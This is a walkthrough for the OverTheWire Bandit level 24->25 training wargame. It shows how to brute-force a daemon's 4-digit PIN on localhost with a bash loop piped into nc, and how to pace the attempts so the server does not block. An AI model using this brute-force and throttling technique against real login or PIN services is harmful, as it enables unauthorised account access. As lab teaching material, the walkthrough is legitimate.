# [Bandit24->25](https://overthewire.org/wargames/bandit/bandit25.html)

## Level Goal

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric **4-digit pincode**. There is no way to retrieve the pincode except by going through **all** of the **10000 combinations**, called **brute-forcing**.<br/>
**You do not need to create new connections each time**

## Commands useful to solve the level

- [nc](https://www.commandlinux.com/man-page/man1/nc.1.html)
- [printf](https://www.gnu.org/software/coreutils/manual/html_node/printf-invocation.html#printf-invocation)

## Helpful Reading Material

- [Brute force attack](https://en.wikipedia.org/wiki/Brute-force_attack)
- [Brace Expansion](https://www.gnu.org/software/bash/manual/bash.html#Brace-Expansion)
- [Looping Constructs](https://www.gnu.org/software/bash/manual/bash.html#Looping-Constructs)

## Where to start?

We already know that there is a daemon listening on port 30002 which listens for our password. The goal here is to find an efficient way to brute-force the password for the next level.

<details>
<summary><h3 style="display:inline-block">Part 1 : Getting to know the daemon</h3></summary>

This part will be pretty short as we already have experience with daemons (see [bandit14](/bandit/bandit14.md) for more explanations). We will simply connect and try to communicate 
with the daemon to see how we should speak with it.
<details>
<summary>Hint</summary>

By using the `nc` utility, can you figure out the format of the string you should send the daemon in order to craft your brute-force attack?
</details>

<details>
<summary>Solution</summary>

Using nc, we can speak with the daemon and run the following tests :
```bash
bandit24@bandit:/tmp/abcdef.PtK5$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
bandit24_password 0000
Wrong! Please enter the correct pincode. Try again.
bandit24_pasword 0001
Wrong! Please enter the correct pincode. Try again.
^C
bandit24@bandit:/tmp/abcdef.PtK5$ 
```
Using that information, we know the format of the string we're supposed to send to the daemon to try to bruteforce the password. Let's know try and use this 
knowledge to craft our brute-force attack.
</details>
</details>


<details>
<summary><h3 style="display:inline-block">Part 2 : Crafting the attack</h3></summary>

Now that we know how to communicate with the server and that we noticed that indeed, we don't have to open a new connection for each message, let's try to generate all the 
password/pincode combinations for our brute-force attack.

<details>
<summary>Hint</summary>

Using the [Brace Expansion](https://www.gnu.org/software/bash/manual/bash.html#Brace-Expansion), the 
[Looping Constructs](https://www.gnu.org/software/bash/manual/bash.html#Looping-Constructs) and 
the [printf](https://www.gnu.org/software/coreutils/manual/html_node/printf-invocation.html#printf-invocation) 
sections of the gnu bash manual, can you figure out a way to generate all the combinations for our attack?
</details>

<details>
<summary>Solution</summary>

You'll be able to find a lot of solutions following the same pattern all over the internet. Let's try to do something a bit different.

We are going to use a `for` loop, but not the one that depends on a pattern, the one that depends on an arithmetic expression.

Here is what our loop is going to be :
```bash
for (( i=0 ; i < 10000 ; ++i )) ; do printf "%s %04d\n" "bandit24_pass" "$i" ; done
```

Here is a detail of what our loop does :

1.	For all the integers between 0 and 9999 it does the following : 
2. It prints the string bandit24\_pass alongside the value of the integer (padded with zeros to fit a field width of 4 characters)
</details>
</details>


<details>
<summary><h3 style="display:inline-block">Part 3 : Launching the attack and retrieving the password</h3></summary>

Now that we know what our for loop looks like, you might want to know why we used this construct instead of the first form. Let's not 
wonder about that for now and instead launch the attack.

<details>
<summary>Hint</summary>

Using our newly constructed for loop, can you figure out a way to use [nc](https://www.commandlinux.com/man-page/man1/nc.1.html) 
to retrieve the password?
</details>

<details>
<summary>Solution</summary>

Here is how we are going to use our for loop to retrieve the password.
```bash
for (( i=0 ; i < 10000 ; ++i )) ; do printf "%s %04d\n" "bandit24_pass" "$i" ; done | nc -w 10 localhost 30002
```
This loop will test all the 10000 strings against the server pin and will be enough to retrieve the password.

> The `-w` option of nc allows to specify a timeout in case the connection becomes idle. If the timeout is reached, the connection 
> will be closed.

</details>
</details>


<details>
<summary><h3 style="display:inline-block">Part 4 : Let me think please</h3></summary>

If this hasn't been patched yet, you might notice that the server blocks indefinitely after a given number of attempts. The goal 
of this last part is to ensure that the server won't block and that we'll be able to test all the connections.

<details>
<summary>Hint</summary>

Using our command from the last part, would you be able to add a simple check to ensure that the server doesn't test all the attempts 
at the same time but waits a bit before sending each chunk of tests.
</details>

<details>
<summary>Solution</summary>

Here is the updated command :
```bash
for (( i=0 ; i < 10000 ; ++i )) ; do if (( $i%500 == 0 )) ; then sleep 1 ; fi ; printf "%s %04d\n" "bandit24_pass" "$i" ; done | nc -w 10 localhost 30002
```
The `if` check ensure that the server gets time to process the input, ensuring that it won't block after a given amount of requests.
</details>
</details>

<details>
<summary><h3 style="display:inline-block">Full Solution</h3></summary>

1. `for (( i=0 ; i < 10000 ; ++i )) ; do if (( $i%500 == 0 )) ; then sleep 1 ; fi ; printf "%s %04d\n" "bandit24_pass" "$i" ; done | nc -w 10 localhost 30002` this 
command will test the password and all of the 10000 pin combinations agains the server pin and prints the password for the next level once the right pin 
has been entered.

> Don't forget to replace bandit24\_pass with the actual password for the bandit24 user.
</details>

You can now jump to the [next level](/bandit/bandit25.md)
